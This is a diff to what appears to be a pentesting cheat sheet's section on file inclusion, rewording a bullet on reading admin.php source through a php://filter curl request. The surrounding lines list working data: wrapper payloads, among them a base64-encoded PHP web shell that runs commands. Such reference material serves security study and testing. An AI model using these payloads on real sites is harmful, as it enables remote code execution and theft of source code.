@@ -1774,7 +1774,7 @@ File inclusion vulnerabilities allow an attacker to include a file into the appl
 - `?file=data:text/plain,hello world`
 - `?file=data:text/plain,<?php echo shell_exec("dir") ?>`
 - `?file=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls`
-- `curl http://victim.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php` obtain source code of `admin.php` encoded in base64. This is to not run the PHP but to fetch the source code
+- Use the command `curl http://victim.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php` to obtain the source code of `admin.php` encoded in base64. This is to not run the PHP and to fetch the source code
   - Some examples for `php://`: [PHP: php:// - Manual](https://www.php.net/manual/en/wrappers.php.php)
 - [Other wrappers](https://www.php.net/manual/en/wrappers.php)
 
